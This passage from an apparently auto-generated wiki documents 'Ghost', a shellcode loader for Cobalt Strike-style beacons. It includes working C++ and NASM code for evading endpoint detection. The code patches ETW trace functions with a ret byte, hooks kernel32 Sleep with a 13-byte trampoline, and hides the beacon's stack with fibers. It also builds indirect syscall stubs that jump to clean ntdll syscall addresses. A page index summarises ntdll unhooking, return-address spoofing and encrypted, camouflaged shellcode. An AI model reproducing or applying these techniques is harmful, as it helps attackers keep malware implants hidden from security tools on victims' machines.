+    A[&quot;PatchETW: resolve ntdll and both trace exports via hashing&quot;] --&gt; B[&quot;NtProtectVirtualMemory PAGE_EXECUTE_READWRITE on offset +3&quot;]
+    B --&gt; C{&quot;NTAPI_VALIDATE_RETURN2VOID status&quot;}
+    C -- failure --&gt; D[&quot;log status and return&quot;]
+    C -- success --&gt; E[&quot;memcpy 0xC3 over offset +3&quot;]
+    E --&gt; F[&quot;ValidateMemory via ret-spoofed memcmp&quot;]
+    F -- mismatch --&gt; G[&quot;fprintf error and return&quot;]
+    F -- match --&gt; H[&quot;NtProtectVirtualMemory restore old protection&quot;]
+    H --&gt; I{&quot;NTAPI_VALIDATE_RETURN2VOID status&quot;}
+    I -- failure --&gt; D
+    I -- success --&gt; J[&quot;again for the second trace function&quot;]
+    J --&gt; K[&quot;log DEBUG patched ETW and return&quot;]
+</div>
+<p>Caption: The single-byte write-protect, copy, verify, and restore lifecycle <code>PatchETW</code> runs for each of the two ETW trace functions.</p>
+<p>Every call shown here — <code>NtProtectVirtualMemory</code>, <code>memcpy</code>, and <code>memcmp</code> (inside <code>ValidateMemory</code>) — is routed through <code>RetSpoofCall(..., Gdgt, ...)</code>, so the patch operation itself does not leave an inline return address that a stack walker would attribute back to the patcher&#39;s frame. <code>SELF_HANDLE</code> (<code>(HANDLE)-1</code>) targets the current process, as defined in <code>defs.h</code>.</p>
+<h2>ValidateMemory</h2>
+<p><code>ValidateMemory</code> confirms that a write actually landed in the page before Ghost proceeds:</p>
+<pre><code class="language-cpp">int ValidateMemory(const void * ptr1, const void * ptr2, size_t num){
+    int result = reinterpret_cast&lt;int&gt;(RetSpoofCall(memcmp, 3, Gdgt, ptr1, ptr2, num));
+    return result;
+}
+</code></pre>
+<p>It is a thin ret-spoofed wrapper around <code>memcmp(destination, sourceBuffer, 1)</code>. A nonzero return means the patched byte does not equal <code>0xC3</code>, so <code>PatchETW</code> prints a mismatched-data error to <code>stderr</code> and aborts (returns) without proceeding to the second target. This guards against a patch that silently failed (for example, because the memory was not writable), rather than assuming the <code>memcpy</code> succeeded.</p>
+<h2>NTAPI_VALIDATE_RETURN2VOID error handling</h2>
+<p>Every NT API call in <code>etw.h</code> is checked with the <code>NTAPI_VALIDATE_RETURN2VOID</code> macro from <code>defs.h</code>:</p>
+<pre><code class="language-cpp">#define NTAPI_VALIDATE_RETURN2VOID(API_NAME, STATUS) \
+    if (STATUS != 0){ \
+        std::cout &lt;&lt; &quot;{!!} &quot; &lt;&lt; #API_NAME &lt;&lt; &quot; failed with status: &quot; \
+                  &lt;&lt; std::hex &lt;&lt; STATUS &lt;&lt; std::endl; \
+        return; };
+</code></pre>
+<p>On a non-zero <code>NTSTATUS</code> it prints the failed API name and the hex status, then <strong>returns from the <code>void</code> function</strong> — exactly the behavior <code>PatchETW</code> (which returns <code>void</code>) needs. <code>etw.h</code> uses this specific macro (rather than the <code>..._RETURN</code> / <code>..._RETURN2NULL</code> siblings in <code>defs.h</code>) for all four protection-operation checks: <code>NtProtectControl</code>, <code>NtProtectEvent</code>, <code>NtProtectControl2</code>, and <code>NtProtectEvent2</code> — the two &quot;set to <code>PAGE_EXECUTE_READWRITE</code>&quot; calls and the two &quot;restore old protection&quot; calls. Aborting on any failed protection change keeps Ghost from writing to a page or leaving it mis-protected when the syscall unexpectedly failed.</p>
+<h2>Invariants and failure semantics</h2>
+<ul>
+<li><strong>The trace function is only patched if it was reachable</strong>: if hashing fails to resolve ntdll or either export, the pointers are <code>NULL</code> and the subsequent <code>+3</code> arithmetic produces invalid addresses; <code>PatchETW</code> provides no explicit null-check before use, so a resolution failure manifests as a fault rather than a reported error.</li>
+<li><strong>Each write is verified before the second target is touched</strong>: a failed <code>NtTraceControl</code> patch stops the routine before <code>NtTraceEvent</code> is attempted.</li>
+<li><strong>Protection is restored to the original value</strong>, not left at <code>PAGE_EXECUTE_READWRITE</code>, so the memory remains as executable-as-before (and read-only) once patched, minimizing the modified-page footprint.</li>
+<li><strong>ETW is disabled before downstream work</strong>: <code>Ghost.cpp</code> calls <code>FlushNTDLL()</code> then <code>PatchETW()</code> before decrypting the payload, so the trace calls that would fire during later injection steps are neutralized first.</li>
+</ul>
+<p><code>PatchETW</code> owns no mutable state of its own; it is a one-shot, <code>void</code> operation with no cleanup requirement beyond restoring page protection, and it is only invoked once from <code>main</code>.</p>
+</article><article class="wiki-page" id="page-6"><div class="page-label">PAGE 6 · concepts/fiber-based-stack-hiding.md</div><hr>
+<p>type: &quot;Reference&quot;
+title: &quot;Fiber-Based Stack Hiding (hook.h)&quot;
+openwiki_generated: true
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-c959c853f7e9085f6114cb2f
+resource: repo://hook.h</li>
+<li>id: openwiki-source-23775c3de52f3ab95a13cb8b
+resource: repo://README.md
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Fiber-Based Stack Hiding (hook.h)</h1>
+<p>Ghost hides the payload&#39;s (beacon&#39;s) entire call stack while it sleeps by combining <strong>a protected-memory trampoline hook</strong> over <code>kernel32!Sleep</code> with <strong>Windows Fibers</strong>. The hook redirects any beacon <code>Sleep</code> call to <code>FiberSwitcher</code>, which switches away to the loader&#39;s original fiber. Because fibers are <strong>userland-only</strong> execution units, neither the fiber switch nor the sleeping state triggers kernel callbacks, so an EDR observing thread/process activity sees the payload vanish rather than parked on a recognizable stack.</p>
+<p>The mechanism lives in <strong><code>hook.h</code></strong>, which owns four pieces that work together:</p>
+<ul>
+<li><code>HookFunction(PVOID FunctionToHook, PVOID RedirectionFunction)</code> — installs the 13-byte trampoline that redirects a target (here <code>Sleep</code>) to our handler.</li>
+<li><code>FiberSwitcher(DWORD dwMilliseconds, ...)</code> — the <code>extern &quot;C&quot;</code> hook handler; records the sleep duration and switches back to <code>InitialFiber</code>.</li>
+<li><code>dwSleepTime</code> — a module-global <code>DWORD</code> that bridges the hook to the waiting loop by carrying the requested sleep duration in milliseconds.</li>
+<li><code>DelayExecution(DWORD dwMilliseconds)</code> — the actual sleep, done with an event + wait so the loader thread blocks without any beacon frame on the stack.</li>
+</ul>
+<p>The fiber infrastructure itself is set up in <code>Ghost.cpp</code> (see <a href="#page-2">loader-pipeline</a>): <code>main()</code> converts the current thread to <code>InitialFiber</code> with <code>ConvertThreadToFiber</code>, then creates the payload fiber <code>Creation</code> from the decrypted, executable shellcode with <code>CreateFiber</code>. From there, <code>main()</code> loops: switch to the payload fiber → it runs until it calls <code>Sleep</code> → the hook fires → switch back → <code>DelayExecution</code> → repeat.</p>
+<h2>The trampoline hook (HookFunction)</h2>
+<p><code>HookFunction</code> installs a minimal, hardcoded x64 trampoline over the target function&#39;s prologue. The author&#39;s own comment on the dialog is blunt: <em>&quot;its shit, BUT it works&quot;</em> — it overwrites the first 13 bytes of the target without preserving or relocating the original prologue, so it is only safe when the target is a function whose overwritten bytes are never needed again (a <code>Sleep</code> stub the beacon uses purely to pause).</p>
+<pre><code class="language-cpp">uint8_t uHook[] = {
+    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // 49 BA imm64  -&gt; mov r10, &lt;imm64&gt;
+    0x41, 0xFF, 0xE2                                             // 41 FF E2     -&gt; jmp r10
+};
+</code></pre>
+<p>The first ten bytes are <code>mov r10, imm64</code> (opcode <code>49 BA</code> followed by an 8-byte immediate), and the final three bytes are <code>jmp r10</code> (<code>41 FF E2</code>). The immediate is filled in at runtime with the address of <code>RedirectionFunction</code> (the hook handler), so executing the first byte of <code>Sleep</code> loads the handler&#39;s address into <code>r10</code> and jumps straight to it. This is a fixed-length, position-independent prologue patch — no relative jump math, no need to know the target address at compile time.</p>
+<p>The patch sequence wraps every operation in the loader&#39;s ret-spoofing wrapper:</p>
+<ol>
+<li><strong>Write the target address into the stub.</strong> <code>RetSpoofCall((void*)memcpy, 2, Gdgt, &amp;uHook[2], &amp;uPatch, sizeof(uPatch))</code> copies the 8-byte <code>RedirectionFunction</code> pointer into <code>uHook</code> bytes 2–9 (the <code>imm64</code> slot).</li>
+<li><strong>Make the target writable.</strong> <code>RetSpoofCall(NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &amp;baseAddress, &amp;regionSize, PAGE_READWRITE, &amp;oldProtect)</code> flips the page containing <code>FunctionToHook</code> to <code>PAGE_READWRITE</code>, validated with <code>NTAPI_VALIDATE_RETURN2VOID(NtProtectHook1, status)</code>.</li>
+<li><strong>Copy the 13-byte stub over the target.</strong> <code>RetSpoofCall((void*)memcpy, 3, Gdgt, FunctionToHook, uHook, sizeof(uHook))</code>.</li>
+<li><strong>Restore the original protection.</strong> A second <code>NtProtectVirtualMemory(..., oldProtect, &amp;oldProtect)</code> returns the page to its prior state, again validated (<code>NtProtectHook2</code>).</li>
+</ol>
+<p>All of these are routed through <code>RetSpoofCall</code> so the hook-installation calls themselves do not leave a detectable inline return address (see <a href="#page-10">return-address-spoofing</a>). Because the stub only jumps and never preserves the original bytes, a stack unwinder that reads the patch as ordinary code simply sees the jump; the trampoline is not designed to be callable or to return to the original <code>Sleep</code>.</p>
+<h2>FiberSwitcher: the extern &quot;C&quot; hook handler</h2>
+<p><code>FiberSwitcher</code> is the function <code>Sleep</code> now jumps to. It is deliberately declared <code>extern &quot;C&quot;</code> so its name has C linkage (no C++ mangling) and it can be passed by address into the assembly/ret-spoofing machinery without decoration issues:</p>
+<pre><code class="language-cpp">extern &quot;C&quot; void FiberSwitcher(DWORD dwMilliseconds, ...) {
+    dwSleepTime = dwMilliseconds;
+    RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, InitialFiber);
+    return;
+}
+</code></pre>
+<p>Its job is only two things:</p>
+<ol>
+<li><strong>Record the requested duration</strong> into the global <code>dwSleepTime</code> so the loader thread can later reproduce the actual sleep. <code>FiberSwitcher</code> itself never sleeps — it just stashes the value.</li>
+<li><strong>Switch back to <code>InitialFiber</code></strong> via <code>RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, InitialFiber)</code>. The source comment marks precisely what this achieves: <em>&quot;when this is executed by the beacon the entire beacon stack gets hidden for the time it sleeps.&quot;</em></li>
+</ol>
+<p><code>FiberSwitcher</code> takes <code>(DWORD dwMilliseconds, ...)</code> — the variadic ellipsis absorbs <code>Sleep</code>&#39;s unused second argument (<code>dwMilliseconds</code> only on <code>SleepEx</code>), keeping the call-compat convention flexible for whichever sleep API is hooked. When <code>SwitchToFiber</code> eventually returns (after the loader thread completes its delay and switches back), <code>FiberSwitcher</code> simply returns, which resumes the beacon&#39;s <code>Sleep</code> call as if it normally completed.</p>
+<h2>dwSleepTime: the global bridge</h2>
+<p><code>dwSleepTime</code> is a plain module-scope <code>DWORD</code> declared in <code>hook.h</code> (no <code>extern</code> in the header, so it is a single translation-unit global shared by <code>hook.h</code>&#39;s functions within the same compilation unit that includes it). It is the connective tissue between the two halves of the sleep mechanism:</p>
+<ul>
+<li><strong>Producer:</strong> <code>FiberSwitcher</code> writes <code>dwSleepTime = dwMilliseconds</code> when a beacon <code>Sleep</code> is intercepted.</li>
+<li><strong>Consumer:</strong> <code>main()</code>&#39;s loop reads <code>DelayExecution(dwSleepTime)</code> after <code>SwitchToFiber</code> returns control, i.e. after the hook fired.</li>
+</ul>
+<p>Because the payload fiber and the loader thread run on the same OS thread (fibers multiplex on one thread), and because <code>FiberSwitcher</code> runs on the payload fiber just before switching away, the write to <code>dwSleepTime</code> is always visible to <code>main()</code> before it schedules the delay — there is no cross-thread synchronization required.</p>
+<h2>DelayExecution: sleeping without a visible stack</h2>
+<p><code>DelayExecution</code> performs the real pause using the NT event/wait pair instead of <code>Sleep</code>, so that while the loader thread blocks, the only thing on the stack is the loader&#39;s own frames (and the ret-spoofed call chain), not the beacon&#39;s.</p>
+<pre><code class="language-cpp">extern &quot;C&quot; void DelayExecution(DWORD dwMilliseconds) {
+    LARGE_INTEGER DelayInterval = { 0 };
+    LONGLONG Delay = NULL;
+    HANDLE hEvent = NULL;
+
+    RetSpoofCall(NtCreateEvent, 5, Gdgt, &amp;hEvent, EVENT_ALL_ACCESS, NULL, 0, FALSE);
+    Delay = dwMilliseconds * 10000;
+    DelayInterval.QuadPart = -Delay;
+    RetSpoofCall(NtWaitForSingleObject, 3, Gdgt, hEvent, FALSE, &amp;DelayInterval);
+    return;
+}
+</code></pre>
+<ul>
+<li><code>NtCreateEvent(</code>..., <code>FALSE)</code> creates an event with <code>EVENT_ALL_ACCESS</code>, no object attributes, and initial state <code>FALSE</code> (non-signaled).</li>
+<li>The requested milliseconds are converted to a <strong>relative timeout</strong> in 100 ns units (<code>dwMilliseconds * 10000</code>) and negated so <code>NtWaitForSingleObject</code> treats it as a relative interval rather than an absolute time.</li>
+<li><code>NtWaitForSingleObject(hEvent, FALSE, &amp;DelayInterval)</code> blocks the thread for that interval. Since the event is never signaled by anyone, the wait expires on its own after the timeout — a pure timed block with no signaled-object dependency.</li>
+</ul>
+<p>Both calls are ret-spoofed, and neither emits the kind of call that would disclose the beacon&#39;s context. From the loader thread&#39;s perspective, the loop simply: switch to payload → payload calls <code>Sleep</code> → hook switches back → <code>DelayExecution(dwSleepTime)</code> blocks for the requested interval → loop again.</p>
+<h2>Why fibers hide the stack from kernel callbacks</h2>
+<p>Windows Fibers are a userland-only scheduling primitive: <code>ConvertThreadToFiber</code>, <code>CreateFiber</code>, and <code>SwitchToFiber</code> run entirely in the process context with no kernel scheduling decision and therefore <strong>no kernel callback</strong> (unlike thread creation/suspension, which EDRs observe via <code>PsSetCreateThreadNotifyRoutine</code> and related callbacks). The repository README states this directly:</p>
+<blockquote>
+<p>ghost makes use of Fiber threads to circumvent this detection technique, fiber threads are userland only execution units that does not alert any registered kernel callbacks</p>
+</blockquote>
+<p>The consequence for stack hiding: when the beacon calls <code>Sleep</code> and <code>FiberSwitcher</code> switches to the loader&#39;s <code>InitialFiber</code>, the beacon&#39;s stack frames are <strong>swapped out</strong> of the live thread stack entirely. Any EDR that walks the current thread&#39;s stack at that moment sees only the loader&#39;s frames (<code>main</code>, <code>DelayExecution</code>, the ret-spoofed NT calls) — the beacon&#39;s call frames are nowhere on the current stack. When the delay ends and the loop switches back to the payload fiber, the beacon&#39;s frames are restored in full. This is the second of Ghost&#39;s two stack-hiding techniques (the first being per-call return-address spoofing via <code>RetSpoofCall</code>).</p>
+<div class="mermaid pending">sequenceDiagram
+    participant M as MainInitialFiber
+    participant P as PayloadFiber
+    participant H as SleepHook
+    participant D as DelayExecution
+
+    M-&gt;&gt;M: ConvertThreadToFiber (InitialFiber)
+    M-&gt;&gt;M: CreateFiber(payload entry) = Creation
+    loop while true
+        M-&gt;&gt;P: SwitchToFiber(Creation)
+        Note over P: payload/beacon runs
+        P-&gt;&gt;H: calls Sleep(dwMilliseconds)
+        H-&gt;&gt;H: dwSleepTime = dwMilliseconds
+        H-&gt;&gt;M: SwitchToFiber(InitialFiber)
+        Note over M: beacon stack hidden
+        M-&gt;&gt;D: DelayExecution(dwSleepTime)
+        Note over D: NtCreateEvent + NtWaitForSingleObject (event wait)
+        D--&gt;&gt;M: timeout expires, returns
+    end
+</div>
+<p><em>The fiber switching sleep cycle: main converts itself to a fiber, creates the payload fiber from executable shellcode, then alternates — switch to payload → it calls Sleep → the hooked FiberSwitcher switches back → main DelayExecution&#39;s → loop.</em></p>
+<h2>C2-assumption: hooking Sleep assumes Cobalt Strike</h2>
+<p>The whole scheme pivots on the beacon actually pausing via <code>kernel32!Sleep</code> (or <code>SleepEx</code>). <code>HookFunction(Sleep, FiberSwitcher)</code> in <code>Ghost.cpp</code> hardcodes the symbol <code>Sleep</code>, which is correct for a <strong>Cobalt Strike</strong>-style beacon. The README is explicit that this assumption is a customization point:</p>
+<blockquote>
+<p>Ghost heavily relies on understanding how your beacon sleeps, in case of cobalt strike the kernel32!Sleep function is hooked and replaced with fiber calls to allow switching and hiding the beacon callstack. If you want to use it with other C2 beacons you will need to use a tool like apimonitor to intercept api calls for your &quot;beacon&quot;, detect the api called on sleep and replacing it in Ghost.cpp to hook it, for example for MDSec&#39;s NightHawk one of the CreateThreadPool APIs needs to be hooked.</p>
+</blockquote>
+<p>So for other C2s the pipeline is identical — same <code>HookFunction</code> trampoline, same <code>FiberSwitcher</code>/<code>DelayExecution</code> pair, same loop — but the first argument to <code>HookFunction</code> must be swapped for the sleep API that beacon actually calls. This is why <code>FiberSwitcher</code> keeps the variadic <code>...</code>: its signature is tolerant of the differing auxiliary arguments different sleep APIs pass.</p>
+<h2>State, lifecycle, and invariants</h2>
+<ul>
+<li><strong>Setup</strong> (<code>main()</code>, <code>Ghost.cpp</code>): <code>HookFunction(Sleep, FiberSwitcher)</code> runs <strong>before</strong> any fiber is created, so <code>Sleep</code> is already redirected when the payload fiber first runs. Then <code>InitialFiber = ConvertThreadToFiber(NULL)</code> converts the current loader thread, and <code>Creation = CreateFiber(NULL, pLPI-&gt;lpData, NULL)</code> creates the payload fiber whose start routine is the decrypted shellcode.</li>
+<li><strong>Steady state</strong>: <code>main()</code>&#39;s infinite <code>while (true)</code> loop is the sole scheduler: <code>SwitchToFiber(Creation)</code> runs the beacon until it calls <code>Sleep</code>; the hook then <code>SwitchToFiber(InitialFiber)</code> back; <code>DelayExecution(dwSleepTime)</code> blocks; and the loop resumes. The beacon never yields control except through the hooked <code>Sleep</code>.</li>
+<li><strong>Lifecycle invariant — single-threaded fiber multiplexing</strong>: all switches happen on one OS thread, so there is no data race on <code>dwSleepTime</code>: the hook writes it on the payload fiber immediately before the switch back, and <code>main()</code> reads it only after the switch has returned.</li>
+<li><strong>No return from <code>main()</code></strong>: the loop is unbounded; <code>main()</code> never reaches its <code>return 0</code> because <code>SwitchToFiber</code>/<code>DelayExecution</code> always loop back.</li>
+</ul>
+<h2>Failure semantics and limitations</h2>
+<ul>
+<li><strong><code>HookFunction</code> never preserves the original prologue.</strong> Overwritten bytes of <code>Sleep</code> are gone; the trampoline is a one-way jump. If the target function were ever genuinely needed (not merely to block), this hook would break it — the author&#39;s own &quot;it&#39;s shit, BUT it works&quot; caveat.</li>
+<li><strong>Protection failures abort the hook.</strong> Each <code>NtProtectVirtualMemory</code> result is validated with <code>NTAPI_VALIDATE_RETURN2VOID</code>; on nonzero <code>NTSTATUS</code> the function returns without installing the hook, and the loader continues (the hook simply never takes effect).</li>
+<li><strong>Broken if the beacon sleeps through a different API.</strong> If the beacon does not call the hooked symbol, the fiber loop&#39;s <code>SwitchToFiber(Creation)</code> returns only when the beacon itself switches/returns, and the <code>Sleep</code>-driven timing never engages. This is the central limitation the README flags and why the hook target must match the C2&#39;s sleep call.</li>
+</ul>
+</article><article class="wiki-page" id="page-7"><div class="page-label">PAGE 7 · concepts/index.md</div><h1>Files</h1>
+<ul>
+<li><a href="#page-4">API Resolution &amp; Custom Hashing (resolvers.h, hash.h, functions.h)</a> - How Ghost resolves Windows API functions without importing them at link time, using PEB loader walking, PE export-table parsing, and a custom WEIRDHASHA hash function, plus SSN and decoy-address resolution for indirect syscalls.</li>
+<li><a href="#page-5">ETW Patching (etw.h)</a> - How Ghost disables Event Tracing for Windows by patching NtTraceEvent and NtTraceControl in ntdll with an early ret (0xC3) at offset +3, using API hashing, ret-spoofed NtProtectVirtualMemory/memcpy/memcmp calls, and the NTAPI_VALIDATE_RETURN2VOID error macro.</li>
+<li><a href="#page-6">Fiber-Based Stack Hiding (hook.h)</a></li>
+<li><a href="#page-8">Indirect Syscalls &amp; SSN Resolution (syscalls.asm)</a> - How Ghost&#39;s NASM stubs in syscalls.asm load dynamically resolved SSNs and jump to decoy syscall addresses inside ntdll, so every syscall instruction executes in clean ntdll code and bypasses userland EDR hooks on the stub.</li>
+<li><a href="#page-9">NTDLL Unhooking via Suspended Process (unhook.h, ntprocessapi.h)</a> - How Ghost flushes EDR hooks from ntdll by creating a suspended audiodg.exe via an indirect syscall, reading a clean copy of ntdll from it with SysNtReadVirtualMemory, and copying the clean .text section back into the local process through NtProtectVirtualMemory.</li>
+<li><a href="#page-10">Return Address Spoofing (RetSpoofCall)</a> - How Ghost&#39;s RetSpoofCall variadic assembly wrapper in retaddrspoof.asm places a random &#39;call r12&#39; ROP gadget as the return address of every sensitive call, so EDR stack unwinding never attributes the call back to the loader&#39;s frames.</li>
+<li><a href="#page-11">Shellcode Encryption &amp; Memory Hiding (AES.h, allocator.h, rsrc.h)</a> - How Ghost keeps its shellcode hidden from disk and memory scanning — pulling the AES-CBC-encrypted payload from an .ico RCDATA resource, decrypting it through the hash-resolved BCrypt API, and camouflaging the plaintext inside a large random-filled allocation (the Roshtyak technique).</li>
+</ul>
+</article><article class="wiki-page" id="page-8"><div class="page-label">PAGE 8 · concepts/indirect-syscalls.md</div><hr>
+<p>type: concept
+title: Indirect Syscalls &amp; SSN Resolution (syscalls.asm)
+description: How Ghost&#39;s NASM stubs in syscalls.asm load dynamically resolved SSNs and jump to decoy syscall addresses inside ntdll, so every syscall instruction executes in clean ntdll code and bypasses userland EDR hooks on the stub.
+tags: [indirect-syscalls, ssn, assembly-stubs, ntdll, syscall, evasive-calling, decoy-address]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-dcba33204cd15ff156692bf1
+resource: repo://functions.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-4e7b26c8e7c6aa4453161bae
+resource: repo://ntprocessapi.h</li>
+<li>id: openwiki-source-8194cb6085876618fe7c465b
+resource: repo://resolvers.h</li>
+<li>id: openwiki-source-e982a2c1bff6b6cb1af1f6e3
+resource: repo://retaddrspoof.h</li>
+<li>id: openwiki-source-28a2ba913c2f3cb2e3abbe21
+resource: repo://syscalls.asm</li>
+<li>id: openwiki-source-16495399652492148bfde7f3
+resource: repo://unhook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Indirect Syscalls &amp; SSN Resolution (syscalls.asm)</h1>
+<p>Ghost performs its most sensitive native calls — process creation, virtual-memory read/protect, and process termination — through <strong>indirect syscalls</strong>: small assembly thunks in <code>syscalls.asm</code> load a service syscall number (SSN) from a global variable and then <code>jmp</code> to a <em>decoy</em> <code>syscall</code> instruction that lives inside ntdll itself. This page documents the four assembly stubs, how they are wired to the C++ globals in <code>functions.h</code>, where they are used, and why executing the <code>syscall</code> instruction at a decoy address defeats EDR hooks that patch stub code.</p>
+<p>The mechanism has three cooperating layers:</p>
+<ul>
+<li><strong><code>syscalls.asm</code></strong> — NASM code (assembled with <code>nasm -f win64</code> into <code>syscalls.o</code>) that defines the <code>SysNt*</code> thunks. It is NOT MASM: the file header warns it &quot;can only be assembled with NASM assembler&quot;.</li>
+<li><strong><code>functions.h</code></strong> — declares the <code>extern &quot;C&quot;</code> SSN/decoy-address globals and populates them at static initialization by calling <code>GetSysCallByWalking</code> from <code>resolvers.h</code>.</li>
+<li><strong><code>resolvers.h</code></strong> — <code>GetSysCallByWalking</code> walks ntdll&#39;s contiguous 0x20-byte syscall stubs to derive each SSN and a decoy <code>syscall</code> address (see <a href="#page-4">api-resolution-and-hashing</a>).</li>
+</ul>
+<h2>The four assembly stubs (syscalls.asm)</h2>
+<p>Each exported thunk follows the same shape. <code>SysNtCreateUserProcess</code> opens with a <code>lea</code> and the other three use <code>mov</code>, but all four do the same three things:</p>
+<ol>
+<li>Move the first register argument <code>rcx</code> into <code>r10</code> — the x64 fastcall/windows syscall convention requires the syscall number in <code>eax</code> and the first argument in <code>r10</code> (the <code>syscall</code> instruction clobbers <code>rcx</code>).</li>
+<li>Load the SSN from a global <code>DWORD</code> variable into <code>eax</code>.</li>
+<li><code>jmp qword [sysCallXxx]</code> — an indirect jump to the stored decoy <code>syscall</code> address.</li>
+</ol>
+<pre><code class="language-nasm">; NtReadVirtualMemory stub
+global SysNtReadVirtualMemory
+SysNtReadVirtualMemory:
+    mov r10, rcx
+    mov eax, dword [dwNtReadVirtualMemory]
+    jmp qword [sysCallNtRead]
+    ret
+</code></pre>
+<p>The <code>ret</code> after the <code>jmp</code> is never reached in normal flow — it is a leftover guard so the function ends cleanly if the <code>jmp</code> is ever bypassed or patched. The four stubs and their SSN globals / decoy-address globals are:</p>
+<table>
+<thead>
+<tr>
+<th>Stub (exported)</th>
+<th>SSN global</th>
+<th>Decoy global</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SysNtCreateUserProcess</code></td>
+<td><code>dwNtCreateUserProccess</code></td>
+<td><code>sysCallNtCreateProcess</code></td>
+</tr>
+<tr>
+<td><code>SysNtReadVirtualMemory</code></td>
+<td><code>dwNtReadVirtualMemory</code></td>
+<td><code>sysCallNtRead</code></td>
+</tr>
+<tr>
+<td><code>SysNtProtectVirtualMemory</code></td>
+<td><code>dwNtProtectVirtualMemory</code></td>
+<td><code>sysCallNtProtect</code></td>
+</tr>
+<tr>
+<td><code>SysNtTerminateProcess</code></td>
+<td><code>dwNtTerminateProcess</code></td>
+<td><code>sysCallNtTerminate</code></td>
+</tr>
+</tbody></table>
+<p>Note the typo <code>dwNtCreateUserProccess</code> (double &quot;c&quot;) is preserved in both the assembly <code>extern</code> and the C++ definition — they must match exactly for the linker to resolve the symbol.</p>
+<h2>extern wiring between syscalls.asm and functions.h</h2>
+<p><code>syscalls.asm</code> declares the two families of globals it consumes as <code>extern</code>:</p>
+<pre><code class="language-nasm">extern dwNtCreateUserProccess
+extern dwNtReadVirtualMemory
+extern dwNtProtectVirtualMemory
+extern dwNtTerminateProcess
+
+extern sysCallNtCreateProcess
+extern sysCallNtRead
+extern sysCallNtProtect
+extern sysCallNtTerminate
+</code></pre>
+<p><code>functions.h</code> defines those same symbols inside an <code>extern &quot;C&quot;</code> block so C++ name mangling does not break the link with the NASM object:</p>
+<pre><code class="language-cpp">extern &quot;C&quot; {
+    // SSN Variables
+    DWORD dwNtCreateUserProccess = 0;
+    DWORD dwNtReadVirtualMemory = 0;
+    DWORD dwNtProtectVirtualMemory = 0;
+    DWORD dwNtTerminateProcess = 0;
+
+    // SYSCALL Variables
+    UINT_PTR sysCallNtCreateProcess = 0;
+    UINT_PTR sysCallNtRead = 0;
+    UINT_PTR sysCallNtProtect = 0;
+    UINT_PTR sysCallNtTerminate = 0;
+}
+</code></pre>
+<p>The <code>extern</code> declarations in the assembly reference the C++ <code>DWORD</code> (4-byte SSN) and <code>UINT_PTR</code> (8-byte decoy-address) definitions by plain symbol name. <code>build.py</code> assembles <code>syscalls.asm</code> with NASM (<code>NASM -f win64 syscalls.asm -o build/syscalls.o</code>) and links that object together with the C++ translation unit, at which point the linker resolves the assembly <code>extern</code>s against the <code>functions.h</code> definitions.</p>
+<h2>Resolving the SSN and decoy address: GetSysCallByWalking</h2>
+<p>The SSN and decoy-address globals are not hardcoded. At static initialization, <code>functions.h</code> drives <code>GetSysCallByWalking</code> once per syscall, supplying an output pointer for both the SSN and the decoy address:</p>
+<pre><code class="language-cpp">PVOID s = GetSysCallByWalking(2050401239, &amp;dwNtCreateUserProccess, &amp;sysCallNtCreateProcess); // NtCreateUserProcess
+PVOID h = GetSysCallByWalking(809892425,  &amp;dwNtReadVirtualMemory,  &amp;sysCallNtRead);          // NtReadVirtualMemory
+PVOID i = GetSysCallByWalking(3375077829, &amp;dwNtProtectVirtualMemory,&amp;sysCallNtProtect);       // NtProtectVirtualMemory
+PVOID t = GetSysCallByWalking(2224556388, &amp;dwNtTerminateProcess,   &amp;sysCallNtTerminate);     // NtTerminateProcess
+</code></pre>
+<p><code>GetSysCallByWalking</code> (in <code>resolvers.h</code>) resolves the real exported ntdll function by hash, then walks the adjacent 0x20-byte syscall stubs that ntdll lays out contiguously in SSN order. For the first neighbor considered clean by <code>IsHooked</code> (standard prologue <code>4C 8B D1 B8</code> = <code>mov r10, rcx</code> / <code>mov eax, imm</code>), it:</p>
+<ul>
+<li>reads the SSN from the stub&#39;s <code>mov eax, imm</code> operand (<code>neighbor[4]</code>, or a 16-bit value when a 3-byte SSN is present), corrected by <code>- track</code> to account for skipped hooked stubs, and writes it into the <code>dwNt*</code> global; and</li>
+<li>writes <code>neighbor + 0x12</code> — the offset of the <code>syscall</code> instruction inside the clean stub — into the <code>sysCallNt*</code> global.</li>
+</ul>
+<p>So after static initialization, <code>dwNtX</code> holds the numeric SSN and <code>sysCallNtX</code> holds the address of an unhooked <code>syscall</code> instruction inside ntdll. The full algorithm is documented on <a href="#page-4">api-resolution-and-hashing</a>.</p>
+<h2>Where the stubs are used</h2>
+<p>The four <code>SysNt*</code> thunks are never called directly; they are always funneled through <code>RetSpoofCall</code> so return-address spoofing rides on top of the indirect syscall.</p>
+<p><strong><code>unhook.h</code></strong> performs ntdll unhooking by first spawning a suspended <code>audiodg.exe</code>, reading a clean copy of ntdll from it, and then restore-writing that copy over the local <code>.text</code> section. All three native operations use the syscall stubs:</p>
+<ul>
+<li><code>SysNtReadVirtualMemory</code> — <code>ReadBufferFromProcess</code> reads the remote, clean ntdll image (<code>RetSpoofCall(SysNtReadVirtualMemory, 5, Gdgt, hProcess, BASE, bufferMemory, ...)</code>).</li>
+<li><code>SysNtTerminateProcess</code> — <code>ReadBufferFromProcess</code> tears down the temporary process after the read (<code>RetSpoofCall((void*)SysNtTerminateProcess, 2, Gdgt, hProcess, 0)</code>).</li>
